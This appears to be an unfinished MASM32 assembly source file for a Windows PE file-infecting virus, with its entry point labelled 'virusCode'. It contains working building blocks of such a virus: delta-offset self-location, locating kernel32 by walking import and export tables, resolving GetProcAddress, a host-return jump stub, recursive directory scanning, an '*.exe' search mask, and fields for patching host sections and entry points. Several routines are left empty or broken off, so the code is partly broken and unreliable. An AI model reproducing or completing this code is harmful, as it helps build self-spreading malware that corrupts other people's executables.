.586
.model flat,stdcall
option casemap:none

   include windows.inc
   include user32.inc
   include kernel32.inc
   include masm32.inc
   include masm32rt.inc
   
   includelib user32.lib
   includelib kernel32.lib
   includelib masm32.lib
   
.data
FindFirstFileError              BYTE                        "FindFirstFile failed ", 0
FindFirstFileSuccess            BYTE                        "First file found with success ", 0
FindNextFileError               BYTE                        "FindNextFile failed ", 0
FindNextFileSuccess             BYTE                        "FirstNextFile found with success ", 0
FolderFound           		  BYTE                        "Folder found", 0

fileFilter 						db 							"*.*",0
backDir 						db 							"..",0
exeFilter 						db 							"*.exe",0
path 							BYTE 						      "C:\Documents and Settings\F.U.C.K\Desktop\test\",0
count 						db 							0

.data?
validPE						dd							?
hDir 							db 							256 dup (?)
ErrorCode                                 DWORD                       			? 

.code
; ---------------------------------------------------------------------------
virusCode:
	pushad
	pushfd
	call delta
delta: 
	pop ebp
	mov eax,ebp
	sub ebp,dword ptr delta
	mov [ebp+delta_var],ebp
	;call 
scan_import:
	mov esi,[image_base+ebp]			; point on image base
	add eax,3ch						;
	mov eax,[eax]					;
	add eax,esi						;
	add eax,128						;
	mov eax,[eax]					;
	add eax,esi
	add eax,12
find_kernel32:
	xor ebx,ebx
	cmp dword ptr [eax],ebx
	je end_objecttable
	call is_it_kernel32
	cmp ecx,3
	jae find_kernel32
find_kernel_image_base:
	mov eax,[eax+4]
	add eax,esi
	mov eax,[eax]
	xchg edi,eax
find_MZ_in_kernel:
	dec edi
	mov esi,edi
	cmp word ptr [edi],"MZ"
	jne find_MZ_in_kernel
	
	mov esi,[esi+3CH]
	cmp esi,dword  ptr 200H
	ja find_MZ_in_kernel
	
	add esi,edi
	cmp word ptr [esi],"PE"
	jne find_MZ_in_kernel
	add esi,52
	
	cmp edi,dword ptr [esi]
	jne find_MZ_in_kernel
	
	mov esi,edi
	add esi,3CH
	mov esi,[esi]
	add esi,edi
	
	add esi,120
	mov esi,[esi]
	add esi,edi				; !!! esi point now to the EXPORT TABLE !!!
	
find_API:
	push ebp
	call find_ProcAddress
	mov ebx,[esp]
	mov dword ptr [ebx+GetProcAddressAdd],ebp
	pop ebp
	
	push ebp
	call find_getModuleHandle

is_it_kernel32: 
	xor ecx,ecx
	mov ebx,dword ptr [eax]
	add ebx,esi
	cmp dword ptr[ebx],"Kern"
	jne az1
	inc ecx
az1:	
	cmp dword ptr[ebx+4],"el32"
	jne az2
	inc ecx
az2:	
	cmp dword ptr[ebx+16],".DLL"
	jne az3
	inc ecx
az3:	
	ret
find_ProcAddress:
	xor eax,eax
	xor ecx,ecx
	xor edx,edx
	xor ebp,ebp
	
	inc edx
	mov eax,esi
	mov ebp,esi
	
	add ebp,28			; ebp now points to RVA of List of Function Addresses    	
	add eax,32
	
	mov ebp,[ebp]
	add ebp,edi
	mov eax,[eax]
	add eax,edi
	
	mov ebx,eax
	mov eax,[ebx]
	add eax,edi
	;invoke SetCurrentDirectory, addr path
	;call ScanFiles
	
	popfd
	popad
	
jump: 
	db 68h,0,0,0,0	
	ret
		
ScanFiles proc
	; Declare local varibles
	LOCAL fileFD  : WIN32_FIND_DATA     
	LOCAL fileHD  : HANDLE
	LOCAL subPath : BYTE
	
	; Find first file 
	; @param path (all : *.*)
	; @param ptr to WIN32_FIND_DATA(fileFD)
	; return : 
	;  + Success :
	;  + Fail : 
	invoke FindFirstFile,addr fileFilter, addr fileFD
		; check return value of eax
		.if eax!=INVALID_HANDLE_VALUE
			mov fileHD,eax
			.while eax>0
				lea esi,fileFD.cFileName
				.if fileFD.cFileName != byte ptr "." && fileFD.cFileName != byte ptr ".."
					;cmp [esi],byte ptr "."
					;je nextfile
					;cmp [esi],byte ptr ".."
					;je nextfile
					.if (fileFD.dwFileAttributes==16) ; check if result is dir
						invoke MessageBox,NULL,addr fileFD.cFileName,addr FolderFound,MB_OK
						invoke SetCurrentDirectory,addr fileFD.cFileName
						call ScanFiles
						invoke SetCurrentDirectory, addr backDir 
					.else
						invoke MessageBox,NULL,addr fileFD.cFileName,addr FindNextFileSuccess,MB_OK
					.endif
				.endif
				
			nextfile:
				invoke FindNextFile, fileHD, addr fileFD
			.endw	
		invoke FindClose,fileHD
		.endif
	ret
ScanFiles endp

CheckFile proc fileName:dword
	lea esi,fileName
	;cmp [esi],[]
	ret

CheckFile endp

OpenFileTest proc 
	
	
	ret

OpenFileTest endp

end_objecttable:

image_base    				dd    0h 
kernel_string   		      	db    "kernel32.dll", 0 
search_mask    				db    "*.exe", 0 
handle       				dd    0h
GetProc     				dd    0h
file_handle    				dd    0h
GetMod       				dd    0h
delta_var    				dd    0h
map_handle    				dd    0h
file_map_handle    			dd    0h
mem_map_handle    			dd    0h
host_opt_size    				dw    0h
host_no_sect    				dw    0h
host_file_alig   				dd    0h
host_sec_alig    				dd    0h
host_relc_raw    				dd    0h
virtual_out    				dd    0h
search_handle    				dd    0h
host_rel_tab    				dd    0h
host_new_entry    			dd    0h    

Win32Data:
      FileAttributes           	dd 0              ;attributes
      CreationTime             	dd 0,0            ;time of creation
      LastAccessTime           	dd 0,0            ;last access time
      LastWriteTime            	dd 0,0            ;last modification
      FileSizeHigh             	dd 0              ;filesize
      FileSizeLow              	dd 0              ; "
      Reserved0                	dd 0
      Reserved1                	dd 0
      FileName                 	db 260 dup(?)         ;long filename
      AlternateFileName        	db 13  dup(?)         ;short filename

APIName:
	FindFirstFileAStr    		db    "FindFirstFileA", 0 
	FindNextFileAStr    		db    "FindNextFileA", 0 
	CreateFileAStr        		db    "CreateFileA" , 0
	CreateFileMappingStr    	db    "CreateFileMappingA", 0 
	MapViewOfFileStr    		db    "MapViewOfFile", 0 
	GetProcAddressStr    		db    "GetProcAddress" , 0 
	GetModuleHandleAStr    		db    "GetModuleHandleA", 0 
	UnmapViewOfFileStr    		db    "UnmapViewOfFile", 0 
	CloseHandleStr        		db    "CloseHandle", 0 
	VirtualProtectStr    		db    "VirtualProtect", 0
	
APIAdd:
	FindNextFileAAdd   	 	dd    0h
	FindFirstFileAAdd   	 	dd    0h
	CreateFileAAdd        		dd    0h
	CreateFileMappingAAdd    	dd    0h
	MapViewOfFileAAdd   	 	dd    0h
	GetModuleHandleAAdd  	 	dd    0h
	GetProcAddressAdd    		dd    0h 
	UnmapViewOfFileAdd    		dd    0h
	CloseHandleAdd        		dd    0h
	VirtualProtectAdd    		dd    0h


end virusCode
